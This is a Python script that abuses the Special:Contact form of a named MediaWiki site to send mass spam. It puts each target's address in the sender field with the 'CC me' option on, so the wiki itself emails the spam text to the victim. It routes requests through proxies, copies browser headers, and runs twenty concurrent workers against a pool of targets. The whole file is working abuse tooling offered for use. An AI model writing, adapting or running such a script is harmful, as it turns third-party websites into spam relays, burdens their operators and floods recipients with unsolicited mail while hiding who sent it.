from os.path import basename

import requests

from module import Spam

headers = {
    'authority': 'wiki.flowerhouse.at',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'origin': 'https://wiki.flowerhouse.at',
    'referer': 'https://wiki.flowerhouse.at/index.php/Special:Contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Your email message has been sent.'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'title': 'Special:Contact',
            'wpFromName': 'name',
            'wpFromAddress': target,
            'wpSubject': self.get_text(),
            'wpText': self.get_text(),
            'wpCCme': '1',
            'wpEditToken': '+\\',
            'wpFormType': '',
        }

        response = requests.post('https://wiki.flowerhouse.at/index.php/Special:Contact', headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=10)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s, target_pool_name='g11mp2')
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
